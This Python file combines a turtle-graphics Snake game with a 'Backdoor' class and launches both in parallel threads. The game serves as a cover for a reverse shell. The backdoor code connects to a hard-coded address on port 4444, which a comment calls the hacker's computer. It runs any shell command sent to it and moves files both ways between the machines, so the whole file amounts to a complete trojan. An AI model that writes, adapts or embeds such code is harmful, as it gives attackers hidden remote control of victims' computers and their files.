import threading
import turtle
import time
import random
import socket
import subprocess
import json
import os
import base64

# --- Snake Game Code ---

def run_snake_game():
    delay = 0.1

    # Score
    score = 0
    high_score = 0

    # Set up the screen
    wn = turtle.Screen()
    wn.title("Snake Game")
    wn.bgcolor("green")
    wn.setup(width=600, height=600)
    wn.tracer(0)  # Turns off the screen updates

    # Snake head
    head = turtle.Turtle()
    head.speed(0)
    head.shape("square")
    head.color("black")
    head.penup()
    head.goto(0, 0)
    head.direction = "Stop"

    # Snake food
    food = turtle.Turtle()
    food.speed(0)
    food.shape("circle")
    food.color("red")
    food.penup()
    food.goto(0, 100)

    segments = []

    # Pen
    pen = turtle.Turtle()
    pen.speed(0)
    pen.shape("square")
    pen.color("white")
    pen.penup()
    pen.hideturtle()
    pen.goto(0, 260)
    pen.write("Score: 0  High Score: 0", align="center", font=("Courier", 24, "normal"))

    # Functions
    def go_up():
        if head.direction != "down":
            head.direction = "up"

    def go_down():
        if head.direction != "up":
            head.direction = "down"

    def go_left():
        if head.direction != "right":
            head.direction = "left"

    def go_right():
        if head.direction != "left":
            head.direction = "right"

    def move():
        if head.direction == "up":
            y = head.ycor()
            head.sety(y + 20)

        if head.direction == "down":
            y = head.ycor()
            head.sety(y - 20)

        if head.direction == "left":
            x = head.xcor()
            head.setx(x - 20)

        if head.direction == "right":
            x = head.xcor()
            head.setx(x + 20)

    # Keyboard bindings
    wn.listen()
    wn.onkeypress(go_up, "Up")
    wn.onkeypress(go_down, "Down")
    wn.onkeypress(go_left, "Left")
    wn.onkeypress(go_right, "Right")

    # Main game loop
    while True:
        wn.update()

        # Check for a collision with the border
        if (
            head.xcor() > 290
            or head.xcor() < -290
            or head.ycor() > 290
            or head.ycor() < -290
        ):
            time.sleep(1)
            head.goto(0, 0)
            head.direction = "Stop"

            # Hide the segments
            for segment in segments:
                segment.goto(1000, 1000)

            # Clear the segments list
            segments.clear()

            # Reset the score
            score = 0

            # Reset the delay
            delay = 0.1

            pen.clear()
            pen.write("Score: {}  High Score: {}".format(score, high_score), align="center", font=("Courier", 24, "normal"))

        # Check for a collision with the food
        if head.distance(food) < 20:
            # Move the food to a random position
            x = random.randint(-290, 290)
            y = random.randint(-290, 290)
            food.goto(x, y)

            # Add a segment to the snake
            new_segment = turtle.Turtle()
            new_segment.speed(0)
            new_segment.shape("square")
            new_segment.color("grey")
            new_segment.penup()
            segments.append(new_segment)

            # Shorten the delay
            delay -= 0.001

            # Increase the score
            score += 10

            if score > high_score:
                high_score = score

            pen.clear()
            pen.write("Score: {}  High Score: {}".format(score, high_score), align="center", font=("Courier", 24, "normal"))

        # Move the end segments first in reverse order
        for index in range(len(segments) - 1, 0, -1):
            x = segments[index - 1].xcor()
            y = segments[index - 1].ycor()
            segments[index].goto(x, y)

        # Move segment 0 to where the head is
        if len(segments) > 0:
            x = head.xcor()
            y = head.ycor()
            segments[0].goto(x, y)

        move()

        # Check for a collision with the body
        for segment in segments:
            if segment.distance(head) < 20:
                time.sleep(1)
                head.goto(0, 0)
                head.direction = "Stop"

                # Hide the segments
                for segment in segments:
                    segment.goto(1000, 1000)

                # Clear the segments list
                segments.clear()

                # Reset the score
                score = 0

                # Reset the delay
                delay = 0.1

                pen.clear()
                pen.write("Score: {}  High Score: {}".format(score, high_score), align="center", font=("Courier", 24, "normal"))

        time.sleep(delay)


# --- Backdoor Code ---

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # the ip and port of the hacker computer

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.stdout:
            return result.stdout
        else:
            return result.stderr

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Upload successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if isinstance(command, str):
                    if command.startswith("cd ") and len(command) > 2:
                        path = command.split(" ")[1]
                        command_result = self.change_working_directory_to(path)
                    elif command.startswith("download"):
                        path = command.split(" ")[1]
                        command_result = self.read_file(path).decode()
                    elif command == "exit":
                        self.connection.close()
                        exit()
                    else:
                        command_result = self.execute_system_command(command)
                else:
                    if command[0] == "upload":
                        command_result = self.write_file(command[1], command[2])

            except Exception:
                command_result = "[-] Error during command execution"

            self.reliable_send(command_result)

# Start both threads
def start_snake_game():
    run_snake_game()

def start_backdoor():
    my_backdoor = Backdoor("10.7.2.68", 4444)
    my_backdoor.run()

if __name__ == "__main__":
    thread1 = threading.Thread(target=start_snake_game)
    thread2 = threading.Thread(target=start_backdoor)

    thread1.start()
    thread2.start()

    thread1.join()
    thread2.join()




